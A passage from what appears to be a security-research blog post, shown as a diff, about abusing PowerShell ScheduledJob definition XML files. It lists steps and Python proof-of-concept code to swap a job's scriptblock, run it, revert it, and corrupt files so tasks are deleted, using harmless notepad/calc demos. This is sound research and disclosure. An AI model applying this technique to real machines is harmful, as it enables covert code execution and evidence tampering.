class="na">z:Type=</span><span class="s">&#34;System.TimeSpan&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>PT0S<span class="nt">&lt;/RandomDelay_Value&gt;&lt;Interval_Value</span> <span class="na">z:Id=</span><span class="s">&#34;30&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Int32&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>1<span class="nt">&lt;/Interval_Value&gt;&lt;User_Value</span> <span class="na">i:nil=</span><span class="s">&#34;true&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">/&gt;&lt;TriggerFrequency_Value</span> <span class="na">z:Id=</span><span class="s">&#34;31&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob.TriggerFrequency&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>Once<span class="nt">&lt;/TriggerFrequency_Value&gt;&lt;ID_Value</span> <span class="na">z:Id=</span><span class="s">&#34;32&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Int32&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>1<span class="nt">&lt;/ID_Value&gt;&lt;Enabled_Value</span> <span class="na">z:Id=</span><span class="s">&#34;33&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/Enabled_Value&gt;&lt;/value&gt;&lt;/KeyValuePairOfintScheduledJobTrigger0k6IGDQ3&gt;&lt;/KeyValuePairs&gt;&lt;/Triggers_Member&gt;&lt;CurrentTriggerId_Member</span> <span class="na">z:Id=</span><span class="s">&#34;34&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Int32&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>1<span class="nt">&lt;/CurrentTriggerId_Member&gt;&lt;FilePath_Member</span> <span class="na">z:Id=</span><span class="s">&#34;35&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs<span class="nt">&lt;/FilePath_Member&gt;&lt;OutputPath_Member</span> <span class="na">z:Id=</span><span class="s">&#34;36&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1\Output<span class="nt">&lt;/OutputPath_Member&gt;&lt;InvocationInfo_Member</span> <span class="na">z:Id=</span><span class="s">&#34;37&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob.ScheduledJobInvocationInfo&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;&lt;InvocationInfo_Command</span> <span class="na">z:Id=</span><span class="s">&#34;38&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>Start-Process notepad.exe<span class="nt">&lt;/InvocationInfo_Command&gt;&lt;InvocationInfo_Name</span> <span class="na">z:Ref=</span><span class="s">&#34;17&#34;</span> <span class="na">i:nil=</span><span class="s">&#34;true&#34;</span><span class="nt">/&gt;&lt;InvocationInfo_AdapterType</span> <span class="na">i:nil=</span><span class="s">&#34;true&#34;</span><span class="nt">/&gt;&lt;InvocationInfo_ModuleName</span> <span class="na">z:Id=</span><span class="s">&#34;39&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>PSScheduledJob<span class="nt">&lt;/InvocationInfo_ModuleName&gt;&lt;InvocationInfo_AdapterTypeName</span> <span class="na">z:Id=</span><span class="s">&#34;40&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>ScheduledJobSourceAdapter<span class="nt">&lt;/InvocationInfo_AdapterTypeName&gt;&lt;InvocationParam_ScriptBlock</span> <span class="na">z:Id=</span><span class="s">&#34;41&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>Start-Process calc.exe<span class="nt">&lt;/InvocationParam_ScriptBlock&gt;&lt;InvocationParam_FilePath</span> <span class="na">z:Id=</span><span class="s">&#34;42&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">/&gt;&lt;InvocationParam_InitScript</span> <span class="na">z:Ref=</span><span class="s">&#34;42&#34;</span> <span class="na">i:nil=</span><span class="s">&#34;true&#34;</span><span class="nt">/&gt;&lt;InvocationParam_RunAs32</span> <span class="na">z:Id=</span><span class="s">&#34;43&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Boolean&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/InvocationParam_RunAs32&gt;&lt;InvocationParam_Authentication</span> <span class="na">z:Id=</span><span class="s">&#34;44&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.Management.Automation.Runspaces.AuthenticationMechanism&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span><span class="nt">&gt;</span>Default<span class="nt">&lt;/InvocationParam_Authentication&gt;&lt;InvocationParam_ArgList</span> <span class="na">i:nil=</span><span class="s">&#34;true&#34;</span><span class="nt">/&gt;&lt;/InvocationInfo_Member&gt;&lt;/ScheduledJobDefinition&gt;</span>
+</span></span></code></pre></div><h4 id="interesting-ones">Interesting Ones</h4>
+<ul>
+<li>FilePath: It loads the XML file from the JobStore and parses it. Similarly, if we fire up <code>Start-Job</code> with a task name, it goes to this path and looks for the file there. If we modify the path, it drops the XML file to the new location.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;FilePath_Member</span> <span class="na">z:Id=</span><span class="s">&#34;35&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs<span class="nt">&lt;/FilePath_Member&gt;</span>
+</span></span></code></pre></div><ul>
+<li>Output: Creates output file to the specified path.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;OutputPath_Member</span> <span class="na">z:Id=</span><span class="s">&#34;36&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1\Output<span class="nt">&lt;/OutputPath_Member&gt;</span>
+</span></span></code></pre></div><ul>
+<li>Task-Name: If we modify the task name and the modified name takes precedence during parsing, it will execute the modified task instead of the original one.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;Name_Member</span> <span class="na">z:Id=</span><span class="s">&#34;17&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>shark-job-testing-1<span class="nt">&lt;/Name_Member&gt;</span>
+</span></span></code></pre></div><ul>
+<li>ScheduledJobSourceAdapter: class that provides functionality for retrieving scheduled job run results from the scheduled job store.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;InvocationInfo_ModuleName</span> <span class="na">z:Id=</span><span class="s">&#34;39&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>PSScheduledJob<span class="nt">&lt;/InvocationInfo_ModuleName&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;InvocationInfo_AdapterTypeName</span> <span class="na">z:Id=</span><span class="s">&#34;40&#34;</span> <span class="na">z:Type=</span><span class="s">&#34;System.String&#34;</span> <span class="na">z:Assembly=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>ScheduledJobSourceAdapter<span class="nt">&lt;/InvocationInfo_AdapterTypeName&gt;</span>
+</span></span></code></pre></div><p>When the job is executed, it internally prepares powershell command and finally calls <code>invoke</code> to execute the scriptblock. During command prep, it looks for:</p>
+<ul>
+<li>ScriptBlock (type: ScriptBlock), FilePath (type: string), RunAs32 (type: bool), Authentication (type: enum) ,InitializationScript (type: string) , ArgumentList (type: object)</li>
+</ul>
+<h3 id="potential-abuse">Potential Abuse</h3>
+<ul>
+<li>Check for the existing tasks i.e. enumerate the folder and obtain the task name.</li>
+<li>Parse the task file and store the previous command line.</li>
+<li>Update it with malicious binary/command.</li>
+<li>Start the Job.</li>
+<li>After execution, revert it.</li>
+</ul>
+<p>This case, when a task is already present, we simply modify the existing parameters to execute the malicious binary with Highest RunLevel. Again, Triggering the job manually is not good case. Just tweak it, when the next trigger time hit, it will run.</p>
+<p>For this implementation, we will be writing a simple Python script. When the file is being loaded, it undergoes multiple checks, and if the file is messed up, an exception is thrown during deserialization. This forces to delete the task due to file corruption.</p>
+<p>You can find the full script at:</p>
+<ul>
+<li>gist link =&gt; <a href="https://gist.github.com/shark-asmx/3354359d9e2e8aa01e05939f7b294b6b">https://gist.github.com/shark-asmx/3354359d9e2e8aa01e05939f7b294b6b</a></li>
+</ul>
+<p>To create a task, we&rsquo;ll be relying on powershell.exe</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="k">def</span> <span class="nf">craft_n_create</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fmt_payload</span> <span class="o">=</span> <span class="s2">&#34;{&#34;</span> <span class="o">+</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32</span><span class="se">\\</span><span class="s2">WindowsPowerShell</span><span class="se">\\</span><span class="s2">v1.0</span><span class="se">\\</span><span class="s2">powershell.exe -NoExit -Command Register-ScheduledJob -Name &#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">job_name</span><span class="si">}</span><span class="s2">&#34;  -Trigger ( New-JobTrigger -Once -At ((Get-Date).AddMinutes(</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">time_bound</span><span class="si">}</span><span class="s2">))) -ScriptBlock  </span><span class="si">{</span><span class="n">fmt_payload</span><span class="si">}</span><span class="s2">;exit&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Command Executed &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">out</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+</span></span></code></pre></div><ul>
+<li>Opening the task definition file</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">getpass</span>
+</span></span><span class="line"><span class="cl"> <span class="k">def</span> <span class="nf">open_task</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">username</span> <span class="o">=</span> <span class="n">getpass</span><span class="o">.</span><span class="n">getuser</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="bp">self</span><span class="o">.</span><span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;C:</span><span class="se">\\</span><span class="s2">Users</span><span class="se">\\</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="se">\\</span><span class="s2">AppData</span><span class="se">\\</span><span class="s2">Local</span><span class="se">\\</span><span class="s2">Microsoft</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">PowerShell</span><span class="se">\\</span><span class="s2">ScheduledJobs</span><span class="se">\\</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">job_name</span><span class="si">}</span><span class="se">\\</span><span class="s2">ScheduledJobDefinition.xml&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="bp">self</span><span class="o">.</span><span class="n">tree</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="bp">self</span><span class="o">.</span><span class="n">root</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">tree</span><span class="o">.</span><span class="n">getroot</span><span class="p">()</span>
+</span></span></code></pre></div><ul>
+<li>Starting the task</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="k">def</span> <span class="nf">start_job</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">job_start_cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32</span><span class="se">\\</span><span class="s2">WindowsPowerShell</span><span class="se">\\</span><span class="s2">v1.0</span><span class="se">\\</span><span class="s2">powershell.exe -NoExit -Command Start-Job -DefinitionName </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">job_name</span><span class="si">}</span><span class="s2">;Sleep 4;exit&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">job_start_cmd</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+</span></span></code></pre></div><p><strong>Note:</strong> The log is generated in the output folder only when the task triggers at its scheduled time. Starting the task manually will not create a log.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="n">j</span> <span class="o">=</span> <span class="n">TaskCreation</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">set_job_name</span><span class="p">(</span><span class="s2">&#34;shark-job-testing-1&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">set_payload</span><span class="p">(</span><span class="s1">&#39;Start-Process notepad.exe&#39;</span><span class="p">)</span> <span class="c1"># starts notepad.exe</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">craft_n_create</span><span class="p">()</span> <span class="c1"># job created</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">forge_scriptblock</span><span class="p">(</span><span class="s2">&#34;Start-Process calc.exe&#34;</span><span class="p">)</span> <span class="c1"># forged to execute calc.exe</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">start_job</span><span class="p">()</span> <span class="c1"># starts calc.exe</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">revert_scriptblock</span><span class="p">()</span> <span class="c1"># restored</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">start_job</span><span class="p">()</span> <span class="c1">#starts notepad.exe</span>
+</span></span></code></pre></div><p>Here we go</p>
+<p><img src="/posts/windows-scheduled-job/images/img2.png" alt="Img2"></p>
+<h3 id="interesting-findings">Interesting Findings</h3>
+<p>Removed all pre-existing tasks for demonstration purposes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls -la C:<span class="se">\U</span>sers<span class="se">\s</span>hark<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\S</span>cheduledJobs
+</span></span><span class="line"><span class="cl">total <span class="m">8192</span>
+</span></span><span class="line"><span class="cl">drwxrwxrwx <span class="m">1</span> Administrators shark  <span class="m">4096</span> Aug <span class="m">21</span> 08:05 .
+</span></span><span class="line"><span class="cl">drwxrwxrwx <span class="m">1</span> SYSTEM         SYSTEM <span class="m">4096</span> Aug <span class="m">11</span> 00:37 ..
+</span></span></code></pre></div><p>Created two new tasks i.e. <code>shark-benign-job</code> and <code>shark-malicious-job</code> -&gt; (later renamed to <code>shark-benign-job</code>)</p>
+<p>This stands out: two tasks can share the exact same name. This references the task name directly from the XML file (interesting)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> Get-ScheduledJob <span class="p">|</span> fl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">RunspaceId             : 65593407-674c-4c25-ba90-db9977f281c2
+</span></span><span class="line"><span class="cl">InvocationInfo         : Microsoft.PowerShell.ScheduledJob.ScheduledJobInvocationInfo
+</span></span><span class="line"><span class="cl">Definition             : System.Management.Automation.JobDefinition
+</span></span><span class="line"><span class="cl">Options                : Microsoft.PowerShell.ScheduledJob.ScheduledJobOptions
+</span></span><span class="line"><span class="cl">Credential             :
+</span></span><span class="line"><span class="cl">JobTriggers            : <span class="o">{</span>Microsoft.PowerShell.ScheduledJob.ScheduledJobTrigger<span class="o">}</span>
+</span></span><span class="line"><span class="cl">Id                     : <span class="m">21</span>
+</span></span><span class="line"><span class="cl">GlobalId               : 2c4d7a13-f0c5-4bbc-93d0-9af2b2848ca0
+</span></span><span class="line"><span class="cl">Name                   : shark-benign-job
+</span></span><span class="line"><span class="cl">Command                : Start-Process notepad.exe
+</span></span><span class="line"><span class="cl">ExecutionHistoryLength : <span class="m">32</span>
+</span></span><span class="line"><span class="cl">Enabled                : True
+</span></span><span class="line"><span class="cl">PSExecutionPath        : powershell.exe
+</span></span><span class="line"><span class="cl">PSExecutionArgs        : -NoLogo -NonInteractive -WindowStyle Hidden -Command <span class="s2">&#34;Import-Module PSScheduledJob; </span><span class="nv">$jobDef</span><span class="s2"> =
+</span></span></span><span class="line"><span class="cl"><span class="s2">                         [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore(&#39;shark-benign-job&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">                         &#39;C:\Users\heysa\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs&#39;); </span><span class="nv">$jobDef</span><span class="s2">.Run()&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">RunspaceId             : 65593407-674c-4c25-ba90-db9977f281c2
+</span></span><span class="line"><span class="cl">InvocationInfo         : Microsoft.PowerShell.ScheduledJob.ScheduledJobInvocationInfo
+</span></span><span class="line"><span class="cl">Definition             : System.Management.Automation.JobDefinition
+</span></span><span class="line"><span class="cl">Options                : Microsoft.PowerShell.ScheduledJob.ScheduledJobOptions
+</span></span><span class="line"><span class="cl">Credential             :
+</span></span><span class="line"><span class="cl">JobTriggers            : <span class="o">{</span>Microsoft.PowerShell.ScheduledJob.ScheduledJobTrigger<span class="o">}</span>
+</span></span><span class="line"><span class="cl">Id                     : <span class="m">22</span>
+</span></span><span class="line"><span class="cl">GlobalId               : 2c4d7a13-f0c5-4bbc-93d0-9af2b2848ca0
+</span></span><span class="line"><span class="cl">Name                   : shark-benign-job
+</span></span><span class="line"><span class="cl">Command                : Start-Process notepad.exe
+</span></span><span class="line"><span class="cl">ExecutionHistoryLength : <span class="m">32</span>
+</span></span><span class="line"><span class="cl">Enabled                : True
+</span></span><span class="line"><span class="cl">PSExecutionPath        : powershell.exe
+</span></span><span class="line"><span class="cl">PSExecutionArgs        : -NoLogo -NonInteractive -WindowStyle Hidden -Command <span class="s2">&#34;Import-Module PSScheduledJob; </span><span class="nv">$jobDef</span><span class="s2"> =
+</span></span></span><span class="line"><span class="cl"><span class="s2">                         [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore(&#39;shark-benign-job&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">                         &#39;C:\Users\heysa\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs&#39;); </span><span class="nv">$jobDef</span><span class="s2">.Run()&#34;</span>
+</span></span></code></pre></div><p>This one seems to be more interesting than the previous scenario. The objective was to create a benign job, back up the job, update its parameters, and start it for execution. The file was then corrupted, and the job status was checked, which resulted in the job being removed due to the corruption. The backup was renamed to the original task name and corrupted again, causing the task to be deleted once more.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="n">j</span> <span class="o">=</span> <span class="n">TaskCreation</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">set_job_name</span><span class="p">(</span><span class="s1">&#39;shark-benign-job-x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">set_payload</span><span class="p">(</span><span class="s2">&#34;Start-Process notepad.exe&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">craft_n_create</span><span class="p">()</span> <span class="c1"># job creation</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">forge_output_path</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;C:</span><span class="se">\\</span><span class="s2">Users</span><span class="se">\\</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="se">\\</span><span class="s2">AppData</span><span class="se">\\</span><span class="s2">Local</span><span class="se">\\</span><span class="s2">Microsoft</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">PowerShell</span><span class="se">\\</span><span class="s2">ScheduledJobs</span><span class="se">\\</span><span class="s2">shark-benign-job-x1</span><span class="se">\\</span><span class="s2">Output&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">backup_prev_task</span><span class="p">(</span><span class="n">target_name</span> <span class="o">=</span><span class="s1">&#39;_backup_&#39;</span><span class="p">)</span> <span class="c1"># copies the task to backup</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">forge_output_path</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;C:</span><span class="se">\\</span><span class="s2">Users</span><span class="se">\\</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="se">\\</span><span class="s2">AppData</span><span class="se">\\</span><span class="s2">Local</span><span class="se">\\</span><span class="s2">Microsoft</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">PowerShell</span><span class="se">\\</span><span class="s2">ScheduledJobs</span><span class="se">\\</span><span class="s2">shark-benign-job-x</span><span class="se">\\</span><span class="s2">Output&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">forge_name</span><span class="p">(</span><span class="s1">&#39;shark-benign-job&#39;</span><span class="p">)</span> <span class="c1"># After creating backup, modified the existing one </span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">forge_scriptblock</span><span class="p">(</span><span class="s1">&#39;Start-Process cmd.exe&#39;</span><span class="p">)</span> <span class="c1"># executes cmd.exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">start_job</span><span class="p">()</span> <span class="c1"># triggering it</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">corrupt_xml</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">start_job</span><span class="p">()</span> <span class="c1"># deletes the job </span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">restore_it</span><span class="p">(</span><span class="n">backup_task</span><span class="o">=</span><span class="s2">&#34;_backup_&#34;</span><span class="p">,</span> <span class="n">targetname</span><span class="o">=</span><span class="s2">&#34;shark-benign-job-x&#34;</span><span class="p">)</span> <span class="c1"># abusing the deleted one</span>
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">corrupt_xml</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"> <span class="n">j</span><span class="o">.</span><span class="n">start_job</span><span class="p">()</span> <span class="c1"># deletes the job</span>
+</span></span></code></pre></div><p><img src="/posts/windows-scheduled-job/images/img3.png" alt="Img3"></p>
+<p>These are just few cases; however, many more different cases can be explored with it.</p>
+<p>Let see the role of the WTS (Windows Task Scheduler) API. When a scheduled task is created, the Task Scheduler service registers it</p>
+<p>Inspecting the previous example</p>
+<p>Task: shark-job-testing-1
+File-Path: <code>C:\Windows\System32\Tasks\Microsoft\Windows\PowerShell\ScheduledJobs</code></p>
+<p>We will find XML file, which is actual Task Scheduler XML file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;Task</span> <span class="na">version=</span><span class="s">&#34;1.2&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/windows/2004/02/mit/task&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;RegistrationInfo&gt;</span>
